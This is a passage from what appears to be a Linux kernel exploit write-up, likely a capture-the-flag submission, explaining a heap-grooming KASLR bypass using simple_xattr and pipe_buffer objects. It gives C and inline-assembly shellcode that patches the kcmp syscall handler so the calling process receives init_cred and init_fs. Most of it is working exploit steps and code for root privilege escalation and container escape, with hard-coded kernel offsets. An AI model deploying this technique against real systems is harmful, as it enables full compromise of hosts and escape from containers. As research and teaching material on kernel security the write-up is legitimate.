2. Allocate a `struct simple_xattr` object with `setxattr(PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH, "security.leaked_pages_order2_addr_for_pipe_buffer", value, KMALLOC_8K_SIZE, XATTR_CREATE);`. We will refer to this object as `C`. `C` is allocated from `PAGES_ORDER2_SIZE` pages's freelist. `C` is on the same red black tree as `leaked_content_simple_xattr` object.
3. Use `manipulated_simple_xattr` to leak the address of `C`=> We have a `PAGES_ORDER2_SIZE` page address. We will refer to this address as `pipe_buffer_addr`.
4. Destroy `C`.
5. Call `fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_COUNT_TO_ALLOCATE_PIPE_BUFFER_ON_PAGES_ORDER2 * PAGE_SIZE)`. This will eventually trigger the allocation of `struct pipe_buffer` object on `PAGES_ORDER2_SIZE` pages's freelist.
6. Write data to pipe to populate `struct pipe_buffer` object with useful stuffs.
7. Use `abr_page_read_write_primitive` to read `pipe_buffer_addr` and in case the data look like `struct pipe_buffer` object, we use `pipe_buffer->ops` pointer which contain `anon_pipe_buf_ops` address to calculate kernel base and bypass KASLR.
8. Close the pipe and retry the process in case we didn't find the data look like `struct pipe_buffer` object.

Now, we have kernel base address. We continue to update some useful kernel address.
```c
u64 init_cred = 0x2c72ec0;
u64 init_fs = 0x2dad900;
u64 __x86_return_thunk = 0x14855d0;
u64 __do_sys_kcmp = 0x273d70;

static inline void update_kernel_address(u64 kernel_base)
{
        init_cred += kernel_base;
        init_fs += kernel_base;
        __x86_return_thunk += kernel_base;
        __do_sys_kcmp += kernel_base;
}
```

# Patch `sys_kcmp`
Use `abr_page_read_write_primitive` to patch `kcmp` system call handler with:
```c
extern void privilege_escalation_shellcode_begin(void);
extern void privilege_escalation_shellcode_end(void);

__asm__(
        ".intel_syntax noprefix;"
        ".global privilege_escalation_shellcode_begin;"
        ".global privilege_escalation_shellcode_end;"

        "privilege_escalation_shellcode_begin:\n"

        "mov rax,QWORD PTR gs:0x32380;"
        "shl rdi, 32;"
        "shl rsi, 32;"
        "shr rsi, 32;"
        "or rdi, rsi;"
        "mov QWORD PTR [rax + 0x7c0], rdi;"
        "mov QWORD PTR [rax + 0x7b8], rdi;"
        "mov QWORD PTR [rax + 0x810], rcx;"
        "jmp r8;"

        "privilege_escalation_shellcode_end:\n"
        ".att_syntax;"
);
```

Every process running on Linux is represented by `struct task_struct` from kernel point of view. On the kernel that the exploit is running, these numbers represent:
- when kernel is handle system call, `gs:0x32380` contain pointer to the current process issues syscall
- 0x7c0: task_struct->cred   offset
- 0x7b8: task_struct->real_cred  offset
- 0x810: task_struct->fs  offset

# Privilege escalation
```c
int not_used = -1;
syscall(SYS_kcmp, (u32)(init_cred >> 32), (u32)(init_cred), not_used, init_fs, __x86_return_thunk);
```

This is roughly equivalent to:
```c
struct task_struct *exploit_task_struct = QWORD PTR gs:0x32380;
exploit_task_struct->cred = init_cred;
exploit_task_struct->real_cred = init_cred;
exploit_task_struct->fs = init_fs; // Instead of perform full container escape, set the mount namespace back to `init_fs` is enough to read the flag outside the container.
__x86_return_thunk;
```
